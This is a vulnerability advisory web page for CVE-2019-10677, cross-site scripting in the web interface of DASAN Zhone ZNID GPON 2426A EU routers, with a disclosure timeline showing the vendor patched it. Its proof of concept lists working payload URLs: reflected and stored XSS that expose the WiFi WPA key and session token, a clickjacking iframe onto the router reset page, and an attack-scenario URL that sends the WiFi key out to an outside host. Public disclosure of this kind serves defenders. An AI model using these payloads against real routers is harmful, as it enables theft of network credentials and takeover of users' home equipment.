<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="content-type" content="text/html;charset=utf-8">
        <meta name="description" content="Multiple Cross-Site Scripting (XSS) in DASAN Zhone ZNID GPON 2426A EU (CVE-2019-10677)" />
        <meta name="keywords" content="Cross-Site Scripting, XSS, Zhone, 2426A, ZNID24xxA-Router, ZNID-GPON-2426A-EU, S3.1.285, exploit, poc, CVE-2019-10677" />
        <meta name="author" content="Adam Ziaja">
        <title>Multiple Cross-Site Scripting (XSS) in DASAN Zhone ZNID GPON 2426A EU (CVE-2019-10677)</title>
        <style type="text/css">
            body {
                margin-top: 25px;
                margin-left: 25px;
                background-color: #222930;
                font-family: 'Nunito', sans-serif;
                font-size: 13px;
            }
            p, pre {
                font-family: 'Nunito', sans-serif;
                font-size: 13px;
                color: #E9E9E9;
                text-align: justify;
                -webkit-text-shadow: 0 1.5px 0 black;
                -moz-text-shadow: 0 1.5px 0 black;
                text-shadow: 0 1.5px 0 black;
            }
            a, a:visited {
                color: #4EB1BA;
                text-decoration: none;
            }
            a:hover {
                color: #6A9A1F;
            }
            strong {
                color: #E9C92D;
                font-weight: normal;
            }
            .info, .success, .warning, .error {
                border: 1px solid;
                padding:15px 15px 15px 15px;
                background-repeat: no-repeat;
                background-position: 10px center;
            }
            .info {
                color: #00529B;
                background-color: #BDE5F8;
            }
            .success {
                color: #4F8A10;
                background-color: #DFF2BF;
            }
            .warning {
                color: #9F6000;
                background-color: #FEEFB3;
            }
            .error {
                color: #D8000C;
                background-color: #FFBABA;
            }
            hr {
                width: 150px;
                margin-left: 0;
                text-align: left;
            }
            pre {
                white-space: pre-wrap;       /* css-3 */
                white-space: -moz-pre-wrap;  /* Mozilla, since 1999 */
                white-space: -pre-wrap;      /* Opera 4-6 */
                white-space: -o-pre-wrap;    /* Opera 7 */
                word-wrap: break-word;       /* Internet Explorer 5.5+ */
            }
        </style>
        <link href="https://fonts.googleapis.com/css?family=Nunito" rel="stylesheet" type="text/css">
        <!-- SyntaxHighlighter: poczÄ…tek -->
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shCore.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPHP.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPython.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPerl.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPlain.js"></script>
        <link href="/poc/syntaxhighlighter/styles/shCore.css" rel="stylesheet" type="text/css" />
        <link href="/poc/syntaxhighlighter/styles/shThemeFadeToGrey.css" rel="stylesheet" type="text/css" />
        <script type="text/javascript">
            SyntaxHighlighter.all()
        </script>
        <!-- SyntaxHighlighter: koniec -->
    </head>
    <body>
        <p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10677" target="_blank">CVE-2019-10677</a> &mdash; <strong>Multiple Cross-Site Scripting (XSS) in the web interface of DASAN Zhone ZNID GPON 2426A EU version S3.1.285 application allows a remote attacker to execute arbitrary JavaScript via manipulation of an unsanitized GET parameters.</strong><br/>This vulnerability affects all zNID(s) models running following firmware versions: all releases of 3.0.xxx SW (on 3.0 branch), release 3.1.349 and earlier (on 3.1 branch), release 3.2.087 and earlier (on 3.2 branch), release 4.1.253 and earlier (on 4.1 branch), release 5.0.019 and earlier (on 5.0 branch).</p>
        <p>Proof of Concept:</p>
        <pre class="brush: text"># Exploit Title: Multiple Cross-Site Scripting (XSS) in DASAN Zhone ZNID GPON 2426A EU
# Date: 31.03.2019
# Exploit Author: Adam Ziaja https://adamziaja.com https://redteam.pl
# Vendor Homepage: https://dasanzhone.com
# Version: <= S3.1.285
# Alternate Version: <= S3.0.738
# Tested on: version S3.1.285 (alternate version S3.0.738)
# CVE : CVE-2019-10677

= Reflected Cross-Site Scripting (XSS) =
http://192.168.1.1/zhndnsdisplay.cmd?fileKey=&name=%3Cscript%3Ealert(1)%3C/script%3E&interface=eth0.v1685.ppp

= Stored Cross-Site Scripting (XSS) =
* WiFi network plaintext password
http://192.168.1.1/wlsecrefresh.wl?wl_wsc_reg=%27;alert(wpaPskKey);//
http://192.168.1.1/wlsecrefresh.wl?wlWscCfgMethod=';alert(wpaPskKey);//
* CSRF token
http://192.168.1.1/wlsecrefresh.wl?wlWscCfgMethod=';alert(sessionKey);//

= Clickjacking =
&lt;html&gt;&lt;body&gt;&lt;iframe src=&quot;http://192.168.1.1/resetrouter.html&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;

= Attack scenario =
http://admin:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7e1f1a1317103e4f474c504f4846504f504f">[email&#160;protected]</a>/wlsecrefresh.wl?wl_wsc_reg=';document.location=/*&wlWscCfgMethod=*/'//redteam.pl/'%2BwpaPskKey;//</pre>
        <p>
            <strong>Timeline</strong>:<br>
            2019-03-31 &mdash; requested CVE-2019-10677<br>
            2019-04-01 &mdash; reported to vendor<br>
            2019-09-03 &mdash; security patch
        </p>
        <hr>
        <p>
            <strong>Adam Ziaja</strong> &lt;<a href="https://adamziaja.com">&#97;&#100;&#97;&#109;&#64;&#97;&#100;&#97;&#109;&#122;&#105;&#97;&#106;&#97;&#46;&#99;&#111;&#109;</a>&gt;
        </p>
    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>
